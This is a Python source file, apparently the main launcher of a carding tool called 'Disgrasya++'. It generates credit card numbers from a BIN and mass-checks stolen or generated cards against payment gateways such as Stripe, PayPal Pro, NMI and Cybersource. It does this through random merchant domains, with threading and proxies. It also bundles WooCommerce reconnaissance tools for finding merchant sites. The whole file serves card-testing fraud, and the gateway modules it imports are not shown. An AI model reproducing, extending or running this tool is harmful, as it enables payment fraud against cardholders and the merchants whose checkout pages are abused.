import os
import shutil
import platform
import random
from concurrent.futures import ThreadPoolExecutor
from disgrasya.generate import generate_cards
from disgrasya.cvv.nmi import nmi_api
from disgrasya.cvv.paypalpro import paypalpro_api
from disgrasya.cvv.paypal_pro_payflow import paypal_pro_payflow_api
from disgrasya.cvv.stripe_cc import stripe_cc_api
from disgrasya.cvv.cybersource1 import cybersource_api1
from disgrasya.ccn.ppcp import ppcp_api
from disgrasya.ccn.cybersource2 import cybersource_api2
from disgrasya.woocommmerce.domaintoip import domaintoip_api
from disgrasya.woocommmerce.ipranger import ipranger_api
from disgrasya.woocommmerce.ipschecker import ipschecker_api
from disgrasya.woocommmerce.revereseip import revereseip_api
from disgrasya.woocommmerce.woocommercepm import woocommercepm_api
from disgrasya.testing.lookup import lookup_api

def clear_screen():
    operating_system = platform.system()
    os.system("cls" if operating_system == "Windows" else "clear")

def display_logo():
    R = "\033[0m"
    fade_colors = [
        "\033[38;5;81m",
        "\033[38;5;75m",
        "\033[38;5;69m",
        "\033[38;5;63m",
        "\033[38;5;57m",
    ]

    logo_template = f"""
{{0}}██████╗ ██╗███████╗ ██████╗ ██████╗  █████╗ ███████╗██╗   ██╗ █████╗ 
{{1}}██╔══██╗██║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗
{{2}}██║  ██║██║███████╗██║  ███╗██████╔╝███████║███████╗ ╚████╔╝ ███████║
{{3}}██║  ██║██║╚════██║██║   ██║██╔══██╗██╔══██║╚════██║  ╚██╔╝  ██╔══██║
{{4}}██████╔╝██║███████║╚██████╔╝██║  ██║██║  ██║███████║   ██║   ██║  ██║
{{4}}╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝

{R}

{{3}}Note{R}: Serving you quality tools since 2023
{{3}}Module{R}: Disgrasya++
{{3}}Author{R}: Jaehwan0
{{3}}Version{R}: 10.40.6
"""
    
    logo_lines = logo_template.format(*fade_colors).splitlines()
    width = shutil.get_terminal_size().columns
    centered_logo = "\n".join(line.center(width) for line in logo_lines if line)
    print(centered_logo)

def parse_proxy(proxy_string):
    Y = "\033[38;5;226m"
    if proxy_string:
        try:
            host, port, user, password = proxy_string.split(":")
            return {
                "http": f"http://{user}:{password}@{host}:{port}",
                "https": f"http://{user}:{password}@{host}:{port}",
            }
        except ValueError:
            print(f"[{Y}!{Y}] Invalid proxy format. Use Host:port:user:pass.")
            return None
    return None

def read_file(file_path):
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"Error reading file: {e}")
        return None

def display_menu(options):
    V = "\033[38;5;57m"
    R = "\033[0m"
    for i, option in enumerate(options, start=1):
        print(f"[{V}{i}{R}] {option}")
    print()

def get_choice(prompt):
    V = "\033[38;5;57m"
    R = "\033[0m"
    return input(f"[{V}>{R}] {prompt}: ").strip()

def handle_cvv_gateway():
    clear_screen()
    display_logo()
    display_menu(["paypalpro", "paypal_pro_payflow", "stripe_cc", "nmi", "cybersource"])
    api_choice = get_choice("Enter your choice")
    api_map = {
        "1": "paypalpro",
        "2": "paypal_pro_payflow",
        "3": "stripe_cc",
        "4": "nmi",
        "5": "cybersource1"
    }
    return api_map.get(api_choice)

def handle_cnn_gateway():
    clear_screen()
    display_logo()
    display_menu(["ppcp", "cybersource"])
    api_choice = get_choice("Enter your choice")
    api_map = {
        "1": "ppcp",
        "2": "cybersource2"
    }
    return api_map.get(api_choice)

def handle_testing_gateway():
    clear_screen()
    display_logo()
    display_menu(["lookup (unfinished)"])
    api_choice = get_choice("Enter your choice")
    return "lookup" if api_choice == "1" else None

def handle_woocommerce_tools():
    clear_screen()
    display_logo()
    display_menu(["Domain To IP", "IP Ranger", "IPs Checker", "Reverse IP", "Woocommerce Check Payment Method"])
    api_choice = get_choice("Enter your choice")
    api_map = {
        "1": "domaintoip_api",
        "2": "ipranger_api",
        "3": "ipschecker_api",
        "4": "revereseip_api",
        "5": "woocommercecheck_api"
    }
    return api_map.get(api_choice)

def main():
    Y ="\033[38;5;226m"
    R = "\033[0m"
    clear_screen()
    display_logo()
    print()
    display_menu(["Generate Credit Card", "Check Credit Card", "Woocommerce Tools"])
    choice = get_choice("Enter your choice")

    try:
        if choice == "1":
            gen_input = get_choice("Enter bin").split()
            bin_code = gen_input[0]
            count = int(gen_input[-1])
            
            if len(gen_input) == 2:
                month = "random"
                year = "random"
            else:
                month = gen_input[1]
                year = gen_input[2]
                
            generate_cards(bin_code, month, year, count)
        
        elif choice == "2":
            clear_screen()
            display_logo()
            display_menu(["Cvv Gateway", "Cnn Gateway", "Testing Gateway"])
            gateway_choice = get_choice("Enter your gateway choice")

            if gateway_choice == "1":
                api_type = handle_cvv_gateway()
            elif gateway_choice == "2":
                api_type = handle_cnn_gateway()
            elif gateway_choice == "3":
                api_type = handle_testing_gateway()
            else:
                return print(f"[{Y}!{R}] Invalid gateway choice.")

            if not api_type:
                return print(f"[{Y}!{R}] Invalid API choice.")

            domain_file = get_choice("Enter the path to the domain text file")
            domains = read_file(domain_file)
            if not domains:
                return print(f"[{Y}!{R}] The domain file is empty or could not be read.")

            creditcard_file = get_choice("Enter the path to the credit card text file")
            creditCards = read_file(creditcard_file)
            if not creditCards:
                return print(f"[{Y}!{R}] The credit card file is empty or could not be read.")

            threads = int(get_choice("Enter the number of threads"))
            proxy = get_choice("Optional: Enter proxy (leave blank if not used)") or None
            proxy_info = parse_proxy(proxy)
            print()

            api_map = {
                "ppcp": ppcp_api,
                "nmi": nmi_api,
                "paypalpro": paypalpro_api,
                "paypal_pro_payflow": paypal_pro_payflow_api,
                "stripe_cc": stripe_cc_api,
                "lookup": lookup_api,
                "cybersource1": cybersource_api1,
                "cybersource2": cybersource_api2
            }

            with ThreadPoolExecutor(max_workers=threads) as executor:
                for creditCard in creditCards:
                    random_domain = random.choice(domains)
                    executor.submit(api_map[api_type], random_domain, creditCard, proxy_info)

        elif choice == "3":
            api_type = handle_woocommerce_tools()
            if not api_type:
                return print(f"[{Y}!{R}] Invalid API choice.")

            domain_file = get_choice("Enter the path to the text file")
            domains = read_file(domain_file)
            if not domains:
                return print(f"[{Y}!{R}] The domain file is empty or could not be read.")

            threads = int(get_choice("Enter the number of threads"))
            print()

            api_map = {
                "domaintoip_api": domaintoip_api,
                "ipranger_api": ipranger_api,
                "ipschecker_api": ipschecker_api,
                "revereseip_api": revereseip_api,
                "woocommercecheck_api": woocommercepm_api
            }

            with ThreadPoolExecutor(max_workers=threads) as executor:
                for domain in domains:
                    executor.submit(api_map[api_type], domain)

        else:
            return print(f"[{Y}!{R}] Invalid choice. Please select either 1, 2 or 3.")
    
    except Exception as e:
        return print(f"[{Y}!{R}] An error occurred during processing: {e}")

if __name__ == "__main__":
    main()